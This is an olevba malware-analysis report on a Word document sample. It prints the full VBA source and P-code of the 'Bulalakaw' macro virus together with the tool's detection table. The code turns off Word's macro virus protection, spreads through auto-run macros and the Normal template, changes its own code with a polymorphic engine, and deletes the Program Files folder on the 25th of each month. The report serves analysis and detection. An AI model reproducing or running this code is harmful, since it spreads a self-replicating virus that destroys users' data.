olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mck.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mck.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bulalakaw.bas 
in file: Virus.MSWord.Mck.i - OLE stream: 'Macros/VBA/Bulalakaw'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
        
Sub PolyEngine()
On Error Resume Next
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("Bulalakaw").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("Bulalakaw").CodeModule
Rem NsRxExGjAmDuRkRkMsEhGjJfQjUpMsJnQpRt
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
Rem IlAzPfSeBoKuAjNsDzCrPmRpLvHfVqRsQlUeBzUkTfNjRqMgOwOyBrSeFqDeHz
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("Bulalakaw").CodeModule
PolySize = Int(Rnd * 10)
For Polymorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Rem IpMeLgIiPmMqNiMyUsHoNkLrBoAoVkPhEf
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next Polymorphic
End With
End If
End Sub

Sub Bulalakaw()

    '+++++++++++++++++++++++++++++++++++++++++++++++++
    'Virus Name: Bulalakaw
    'Author: Lucky Warrior
    'Copyright © 1999 Bgy. Tiguib, Oras, Eastern Samar
    'All rights reserved.
    '+++++++++++++++++++++++++++++++++++++++++++++++++
    
On Error Resume Next
Options.ConfirmConversions = False
Rem AqHlPiIqQiDsRkLwRkQhDmKkFtNfVvRxOqIpEr
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("Bulalakaw").Export "c:\Bulalakaw.drv"
ActiveDocument.ReadOnlyRecommended = False
If Day(Now()) = 25 Then
    Shell ("Deltree /y C:\Progra~1")
    End If
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Lucky Warrior"
    .Comments = "Bulalakaw"
    .Execute
Rem MoFuCkGhTvOtSkQhEhPhOsTo
End With
Rem VlSpTi
If NormalTemplate.VBProject.VBComponents.Item("Bulalakaw").Name <> "Bulalakaw" Then SuchBulalakaw = True
If ActiveDocument.VBProject.VBComponents.Item("Bulalakaw").Name <> "Bulalakaw" Then MoreBulalakaw = True
Rem Uk
If SuchBulalakaw = True And MoreBulalakaw = False Then Set PhUz39490774 = NormalTemplate.VBProject.VBComponents
If SuchBulalakaw = False And MoreBulalakaw = True Then Set PhUz39490774 = ActiveDocument.VBProject.VBComponents
PhUz39490774.import "c:\Bulalakaw.drv"
If SuchBulalakaw = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If MoreBulalakaw = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
Breakpoint:
End Sub
Sub FileNew()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Bulalakaw
End Sub
Rem Ry
Sub FileSave()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub EditFind()
    On Error Resume Next
Dialogs(wdDialogEditFind).Show
Rem QmVuOrIwVmLmGyGeDnPrFjAyKqDqMeFeRxPmCmDqEhBtFeByKiFgHmUjNoDtCjNz
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call Bulalakaw
End Sub
Sub FileExit()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Bulalakaw
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call PolyEngine
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mck.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Bulalakaw - 12020 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn Skip (As Integer)
' Line #2:
' Line #3:
' 	FuncDefn (Sub PolyEngine())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	ArgsCall Read 0x0000 
' Line #6:
' 	LitStr 0x0009 "Bulalakaw"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #7:
' 	Ld ActiveLines 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #8:
' 	StartWithExpr 
' 	LitStr 0x0009 "Bulalakaw"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #9:
' 	Rem 0x0025 " NsRxExGjAmDuRkRkMsEhGjJfQjUpMsJnQpRt"
' Line #10:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #11:
' 	Ld TheLine 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TheLine 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	EndIf 
' Line #12:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	Rem 0x003F " IlAzPfSeBoKuAjNsDzCrPmRpLvHfVqRsQlUeBzUkTfNjRqMgOwOyBrSeFqDeHz"
' Line #14:
' 	EndWith 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	StartWithExpr 
' 	LitStr 0x0009 "Bulalakaw"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #17:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St PolySize 
' Line #18:
' 	StartForVariable 
' 	Ld Polymorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #19:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #20:
' 	MemLdWith CountOfLines 
' 	St PolyLines 
' Line #21:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #22:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #23:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #24:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #25:
' 	Rem 0x0023 " IpMeLgIiPmMqNiMyUsHoNkLrBoAoVkPhEf"
' Line #26:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #28:
' 	StartForVariable 
' 	Ld Polymorphic 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	EndWith 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Sub Bulalakaw())
' Line #34:
' Line #35:
' 	QuoteRem 0x0004 0x0031 "+++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #36:
' 	QuoteRem 0x0004 0x0015 "Virus Name: Bulalakaw"
' Line #37:
' 	QuoteRem 0x0004 0x0015 "Author: Lucky Warrior"
' Line #38:
' 	QuoteRem 0x0004 0x0031 "Copyright © 1999 Bgy. Tiguib, Oras, Eastern Samar"
' Line #39:
' 	QuoteRem 0x0004 0x0014 "All rights reserved."
' Line #40:
' 	QuoteRem 0x0004 0x0031 "+++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #41:
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #44:
' 	Rem 0x0027 " AqHlPiIqQiDsRkLwRkQhDmKkFtNfVvRxOqIpEr"
' Line #45:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #47:
' 	LitStr 0x0010 "c:\Bulalakaw.drv"
' 	LitStr 0x0009 "Bulalakaw"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #49:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	LitStr 0x0016 "Deltree /y C:\Progra~1"
' 	Paren 
' 	ArgsCall Shell 0x0001 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #53:
' 	LitStr 0x000D "Lucky Warrior"
' 	MemStWith Author 
' Line #54:
' 	LitStr 0x0009 "Bulalakaw"
' 	MemStWith Comments 
' Line #55:
' 	ArgsMemCallWith Execute 0x0000 
' Line #56:
' 	Rem 0x0019 " MoFuCkGhTvOtSkQhEhPhOsTo"
' Line #57:
' 	EndWith 
' Line #58:
' 	Rem 0x0007 " VlSpTi"
' Line #59:
' 	LitStr 0x0009 "Bulalakaw"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Bulalakaw"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St SuchBulalakaw 
' 	EndIf 
' Line #60:
' 	LitStr 0x0009 "Bulalakaw"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Bulalakaw"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MoreBulalakaw 
' 	EndIf 
' Line #61:
' 	Rem 0x0003 " Uk"
' Line #62:
' 	Ld SuchBulalakaw 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld MoreBulalakaw 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set PhUz39490774 
' 	EndIf 
' Line #63:
' 	Ld SuchBulalakaw 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld MoreBulalakaw 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set PhUz39490774 
' 	EndIf 
' Line #64:
' 	LitStr 0x0010 "c:\Bulalakaw.drv"
' 	Ld PhUz39490774 
' 	ArgsMemCall import 0x0001 
' Line #65:
' 	Ld SuchBulalakaw 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Skip 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #66:
' 	Ld MoreBulalakaw 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #67:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #68:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	Label Breakpoint 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub FileNew())
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #74:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #75:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #76:
' 	LitDI2 0x0001 
' 	St Skip 
' Line #77:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #78:
' 	EndSub 
' Line #79:
' 	Rem 0x0003 " Ry"
' Line #80:
' 	FuncDefn (Sub FileSave())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #83:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #84:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub FileClose())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #89:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #90:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #91:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub ToolsOptions())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #96:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #97:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub EditFind())
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	Ld wdDialogEditFind 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #102:
' 	Rem 0x0041 " QmVuOrIwVmLmGyGeDnPrFjAyKqDqMeFeRxPmCmDqEhBtFeByKiFgHmUjNoDtCjNz"
' Line #103:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #104:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub FileSaveAs())
' Line #107:
' 	OnError (Resume Next) 
' Line #108:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #109:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #110:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub FilePrint())
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #115:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Sub FileExit())
' Line #118:
' 	OnError (Resume Next) 
' Line #119:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #120:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #121:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #122:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #123:
' 	EndSub 
' Line #124:
' 	FuncDefn (Sub AutoOpen())
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #127:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub AutoExit())
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #132:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #133:
' 	EndSub 
' Line #134:
' 	FuncDefn (Sub AutoExec())
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #137:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #138:
' 	EndSub 
' Line #139:
' 	FuncDefn (Sub AutoClose())
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	ArgsCall (Call) Bulalakaw 0x0000 
' Line #142:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #143:
' 	ArgsCall (Call) PolyEngine 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub ViewVBCode())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

